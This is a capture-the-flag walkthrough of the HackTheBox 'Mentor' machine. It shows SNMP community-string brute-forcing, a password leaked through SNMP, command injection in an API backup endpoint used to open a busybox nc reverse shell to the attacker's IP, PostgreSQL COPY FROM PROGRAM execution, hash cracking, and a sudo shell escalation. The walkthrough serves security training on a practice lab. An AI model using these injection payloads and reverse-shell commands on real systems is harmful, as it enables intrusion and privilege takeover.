---
tags:
  - hack
  - linux
---
# HackTheBox: [Mentor](https://app.hackthebox.com/machines/Mentor)

> [!tip]- Summary with Spoilers
> This Linux machine is running a web application with an exploitable API endpoint vulnerable to command injection, but it required careful enumeration to find it. An SNMP service revealed sensitive information, including a process string that leaked credentials. Privilege escalation was straightforward, using the credentials discovered to SSH into the host and leveraging password reuse to escalate to root.

## Enumeration

### `nmap`

#### TCP

- Target: `10.10.11.193`
- Command: `nmap -v --reason -Pn -T4 -p- --open -sCV -oA nmap_tcp-10.10.11.193 10.10.11.193`

##### 22/tcp-ssh `OpenSSH` `8.9p1 Ubuntu 3` `(Ubuntu Linux; protocol 2.0)`

```text
__ssh-hostkey:
  256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
```

##### 80/tcp-http `Apache httpd` `2.4.52`

```text
__http-methods:
  Supported Methods: GET HEAD POST OPTIONS
__http-title:
Did not follow redirect to http://mentorquotes.htb/
__http-server-header:
Apache/2.4.52 (Ubuntu)
```

### Manual Enumeration

The web service redirects to a vhost called `mentorquotes.htb`:

![](_/htb-mentor-20241218-1.png)

#### SNMP

```console
$ snmpbulkwalk -c public -v2c mentorquotes.htb .
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (287203) 0:47:52.03
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
SNMPv2-MIB::sysName.0 = STRING: mentor
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (1) 0:00:00.01
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (288909) 0:48:09.09
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2024-12-18,19:3:39.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 228
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

There isn't much in that SNMP output that's useful.

I tried brute-forcing other community strings with `onesixtyone`, but [apparently](https://0xdf.gitlab.io/2023/03/11/htb-mentor.html#snmp---udp-161) it only works with protocol v1. However, `SNMP-Brute` handles v2c:

```console
$ python3 ./snmpbrute.py -b -a -t mentor.htb
...
Identified Community strings
        0) 10.10.11.193    internal (v2c)(RO)
        1) 10.10.11.193    public (v1)(RO)
        2) 10.10.11.193    public (v2c)(RO)
        3) 10.10.11.193    public (v1)(RO)
        4) 10.10.11.193    public (v2c)(RO)
Finished!
```

The community string `internal` gives up a list of processes, including what looks like a process with a password argument:

```console
$ snmpwalk -c internal -v2c -m ALL mentorquotes.htb | tee snmp-internal.txt
MIB search path: /home/e/.snmp/mibs:/usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
...
HOST-RESOURCES-MIB::hrSWRunParameters.2112 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

Password: `kj23sadkj123as0-d213`

#### Subdomain Fuzzing

[Fuzzing subdomains](using-ffuf-20231120.md) turns up one interesting result, `api.mentorquotes.htb`. I missed this initially because I was filtering out 404 error codes, and the `-mc all` flag was needed for this.

```console
$ ffuf -w ~/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://mentorquotes.htb/ -H 'Host: FUZZ.mentorquotes.htb' -mc all -fw 18
...
api                     [Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 101ms]
#www                    [Status: 400, Size: 308, Words: 26, Lines: 11, Duration: 94ms]
#mail                   [Status: 400, Size: 308, Words: 26, Lines: 11, Duration: 96ms]
:: Progress: [19966/19966] :: Job [1/1] :: 420 req/sec :: Duration: [0:00:48] :: Errors: 0 ::
```

```console
$ feroxbuster -k -u http://api.mentorquotes.htb/ -w ~/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -C404,403 -d1 -EBg -x php
...
404      GET        1l        2w       22c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       69l      212w     2637c http://api.mentorquotes.htb/docs/oauth2-redirect
200      GET        1l       48w     7676c http://api.mentorquotes.htb/openapi.json
307      GET        0l        0w        0c http://api.mentorquotes.htb/docs/ => http://api.mentorquotes.htb/docs
200      GET       31l       62w      969c http://api.mentorquotes.htb/docs
307      GET        0l        0w        0c http://api.mentorquotes.htb/users => http://api.mentorquotes.htb/users/
307      GET        0l        0w        0c http://api.mentorquotes.htb/admin => http://api.mentorquotes.htb/admin/
307      GET        0l        0w        0c http://api.mentorquotes.htb/quotes => http://api.mentorquotes.htb/quotes/
[#>------------------] - 48s    17411/175236  7m      found:7       errors:1
[>-------------------] - 48s     5811/175218  122/s   http://api.mentorquotes.htb/
200      GET       28l       52w      772c http://api.mentorquotes.htb/redoc
...
```

#### API

There is an `openapi.json` file with a full API spec:

```json
$ curl -s http://api.mentorquotes.htb/openapi.json | jq
{
  "openapi": "3.0.2",
  "info": {
    "title": "MentorQuotes",
    "description": "Working towards helping people move forward",
    "contact": {
      "name": "james",
      "url": "http://mentorquotes.htb",
      "email": "james@mentorquotes.htb"
    },
    "version": "0.0.1"
  },
  "paths": {
    "/auth/login": {
      "post": {
...
```

A handy [Redoc](https://redocly.com/docs/redoc) API browser is available at `/doc/redoc`:

![](_/htb-mentor-20241218-2.png)

Now, I have a valid username (`james`) and potentially a way to create my own user and modify content on the site.

It takes me a few tries to get the `curl` command right, but I'm able to create a user:

```console
$ curl http://api.mentorquotes.htb/auth/signup -X POST -d '{"email": "x@x.x", "username": "x", "password": "x"}'
{"detail":[{"loc":["body"],"msg":"value is not a valid dict","type":"type_error.dict"}]}

$ curl http://api.mentorquotes.htb/auth/signup -X POST -H "Content-Type: application/json" -d '{"email": "x@x.x", "username": "x", "password": "x"}'
{"detail":[{"loc":["body","username"],"msg":"ensure this value has at least 5 characters","type":"value_error.any_str.min_length","ctx":{"limit_value":5}},{"loc":["body","password"],"msg":"ensure this value has at least 8 characters","type":"value_error.any_str.min_length","ctx":{"limit_value":8}}]}

$ curl http://api.mentorquotes.htb/auth/signup -X POST -H "Content-Type: application/json" -d '{"email": "x@x.x", "username": "x", "password": "xxxxxxxx"}'
{"detail":[{"loc":["body","username"],"msg":"ensure this value has at least 5 characters","type":"value_error.any_str.min_length","ctx":{"limit_value":5}}]}

$ curl http://api.mentorquotes.htb/auth/signup -X POST -H "Content-Type: application/json" -d '{"email": "x@x.x", "username": "xxxxx", "password": "xxxxxxxx"}'
{"id":4,"email":"x@x.x","username":"xxxxx"}
```

Logging in:

```console
$ curl http://api.mentorquotes.htb/auth/login -X POST -H "Content-Type: application/json" -d '{"email": "x@x.x", "username": "xxxxx", "password": "xxxxxxxx"}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Inh4eHh4IiwiZW1haWwiOiJ4QHgueCJ9.7D5GPsEWtTg2HosVBbkQV2aKMmi68xFC_BY5NeQFEbY"
```

But I can't even read the quotes because the functionality is limited to admin users:

```console
$ curl http://api.mentorquotes.htb/quotes/ -X POST -H "Content-Type: application/json" -H "Authorization: $token"
{"detail":"Only admin users can access this resource"}
```

Instead I decide to try brute-forcing the password for `james`. First I'll filter `rockyou.txt` for only passwords containing eight or more characters, per the target's policy:

```console
$ grep -E '^.{8,}$' rockyou.txt > ~/rockyou-8ormore.txt

$ wc -l rockyou.txt ~/rockyou-8ormore.txt
 14344391 rockyou.txt
  9607061 /home/e/rockyou-8ormore.txt
 23951452 total
```

```console
$ ffuf -u http://api.mentorquotes.htb/auth/login/ -X POST -H "Content-Type: application/json" -w ~/rockyou-8ormore.txt -r -d '{"email": "james@mentorquotes.htb", "username": "james", "password": "FUZZ"}' -mc 200
...
```

Unfortunately, that yields no joy.

I try the password from the SNMP `internal` listing, and it works:

```json
$ curl http://api.mentorquotes.htb/auth/login -H "Content-Type: application/json" -d '{"email": "james@mentorquotes.htb", "username": "james", "password": "kj23sadkj123as0-d213"}' -v
* Host api.mentorquotes.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.193
*   Trying 10.10.11.193:80...
* Connected to api.mentorquotes.htb (10.10.11.193) port 80
> POST /auth/login HTTP/1.1
> Host: api.mentorquotes.htb
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 92
>
< HTTP/1.1 200 OK
< Date: Thu, 02 Jan 2025 19:12:27 GMT
< Server: uvicorn
< content-length: 154
< content-type: application/json
<
* Connection #0 to host api.mentorquotes.htb left intact
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
```

```json
$ curl http://api.mentorquotes.htb/quotes/ -H "Content-Type: application/json" -H "Authorization: $token"
[{"title":" I believed I was good","description":"I was so bad at studies in school. Teachers used to tell me that I should follow a different passion other than typical education. Nonetheless, I got rid of the negativity in myself and others and worked as hard as I could in my finals and college education. Now I am a paid accountant for a major brand in my country.","id":1},{"title":"Find your passion before its too late","description":"When I was growing up, I did not really have much, sure I enjoyed my passion but did not take it seriously. When I worked in a gas station for 3 years at that point I made a decision to go back to education and get a masters degree. Now I am a senior content engineer for a reputed company","id":2},
...
```

## Remote Code Execution

With a valid admin user for the web application, I can add a new quote. I'll try one with some malicious PHP code, but it's escaped:

![](_/htb-mentor-20241218-4.png)

Using `feroxbuster` I find an undocumented API path called `/admin`, with `/admin/backup` and `/admin/check`.

```json
$ curl http://api.mentorquotes.htb/admin/backup -H "Content-Type: application/json" -H "Authorization: $token"
{"detail":"Method Not Allowed"}

$ curl http://api.mentorquotes.htb/admin/backup -H "Content-Type: application/json" -H "Authorization: $token" -d '{}'
{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]}
```

It works but I'm not sure what to do with it yet:

```json
$ curl http://api.mentorquotes.htb/admin/backup -H "Content-Type: application/json" -H "Authorization: $token" -d '{"path": "/etc/passwd"}'
{"INFO":"Done!"}
```

It responds "Done!" no matter what I pass for the argument. After a while, I find a command injection:

```json
$ curl http://api.mentorquotes.htb/admin/backup -H "Content-Type: application/json" -H "Authorization: $token" -d '{"path": "x;ping -c5 10.10.14.3;"}'
{"INFO":"Done!"}
```

![](_/htb-mentor-20241218-5.png)

This is good enough for a reverse shell:

```text
$ curl http://api.mentorquotes.htb/admin/backup -H "Content-Type: application/json" -H "Authorization: $token" -d '{"path": "x;busybox nc 10.10.14.3 443 -e sh;"}'
```

```text
$ rlwrap nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.193 39713
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

I get excited about the `root` user but then realize it's a container:

```console
ls -la /
total 172
drwxr-xr-x    1 root     root          4096 Jan  2 17:21 .
drwxr-xr-x    1 root     root          4096 Jan  2 17:21 ..
-rwxr-xr-x    1 root     root             0 Jan  2 17:21 .dockerenv
drwxr-xr-x    3 root     root          4096 Dec 11  2022 API
drwxr-xr-x    1 root     root          4096 Nov 10  2022 app
-rw-r--r--    1 root     root        101888 Jan  2 20:07 app_backkup.tar
drwxr-xr-x    1 root     root          4096 Jun  8  2022 bin
drwxr-xr-x    5 root     root           340 Jan  2 17:21 dev
drwxr-xr-x    1 root     root          4096 Jan  2 17:21 etc
drwxr-xr-x    1 root     root          4096 Nov 10  2022 home
...
```

But, at least I find `user.txt` in `/home/svc/`.

Peeking inside `app_backkup.tar`:

```console
cat .Dockerfile.swp
b0nano 6.2rootmentorAPI/DockerfileU

cat Dockerfile
FROM python:3.6.9-alpine

RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev

WORKDIR /app
ENV HOME /home/svc
ENV PATH /home/svc/.local/bin:${PATH}
RUN python -m pip install --upgrade pip --user svc
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
RUN pip install pydantic[email] pyjwt
EXPOSE 8000
COPY . .
CMD ["python3", "-m", "uvicorn", "app.main:app", "--reload", "--workers", "100", "--host", "0.0.0.0", "--port" ,"8000"]
```

Here's `db.py` with the database IP address, at least:

```python
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
...
```

PostgreSQL is accessible:

```console
busybox nc -nvz 172.22.0.1 5432 2>&1
172.22.0.1 (172.22.0.1:5432) open
```

I look at `env` and find a secret:

```console
HOSTNAME=0e3d85942e66
WORK_DIR=/app/
PYTHON_PIP_VERSION=19.3.1
SHLVL=3
HOME=/home/svc
OLDPWD=/app
GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py
PATH=/home/svc/.local/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ADMIN_USER=james
ADMIN_EMAIL=james@mentorquotes.htb
LANG=C.UTF-8
SECRET=76dsf761g31276hjgsdkahuyt123
PYTHON_VERSION=3.6.9
PWD=/home/svc
PYTHON_GET_PIP_SHA256=b86f36cc4345ae87bfd4f10ef6b2dbfa7a872fbff70608a1e43944d283fd0eee
```

## Privilege Escalation

I've got a `root` shell inside a container, and network access to its PostgreSQL server. I don't have a `psql` client in the container so I [setup ligolo](pivoting-with-ligolong-20240628.md) to try from my attack host.

After setting up the tunnel, I'll also need to add the route for the target's Docker container network.

```console
$ sudo ip route add 172.22.0.0/16 dev ligolo
```

Then I can login to the database with the default credentials:

```console
$ psql -h 172.22.0.1 -U postgres
Password for user postgres:
psql (16.6 (Ubuntu 16.6-0ubuntu0.24.04.1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=#
```

I can execute code as `postgres` on the database container:

```sql
postgres=# DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'whoami';
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE
CREATE TABLE
COPY 1
postgres=# select * from cmd_exec;
 cmd_output
------------
 postgres
(1 row)
```

However, that's not immediately useful.

I pick up a hash for the `svc` user:

```sql
mentorquotes_db=# select * from users;
 id |         email          |  username   |             password
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)
```

Crackstation has an entry for it: `123meunomeeivani`

I try that username and password on the main target IP for SSH and it works:

```console
$ ssh svc@mentor.htb
...
Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$
```

LinPEAS turns up a password:

```console
╔══════════╣ Analyzing SNMP Files (limit 70)
-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf
# rocommunity: a SNMPv1/SNMPv2c read-only access community name
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
createUser bootstrap MD5 SuperSecurePassword123__ DES
-rw------- 1 Debian-snmp Debian-snmp 1268 Jan  2 17:21 /var/lib/snmp/snmpd.conf
```

On my first pass I thought that was a boilerplate config sample password, but it's not:

```console
svc@mentor:~$ su - james
Password:
james@mentor:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
```

The rest is very easy:

```console
james@mentor:~$ sudo -l
[sudo] password for james:

Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh

james@mentor:~$ sudo /bin/sh -p
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Credits

My first attempt at brute-forcing a private SNMP community string wasn't successful, because I was using `onesixtyone` which only does version 1. I tried again with `SNMP-Brute.py` which handles version 2c, and that worked. Thanks to 0xdf for the hint on [using the proper tool for brute-forcing SNMP v2c community strings](https://0xdf.gitlab.io/2023/03/11/htb-mentor.html#snmp---udp-161).
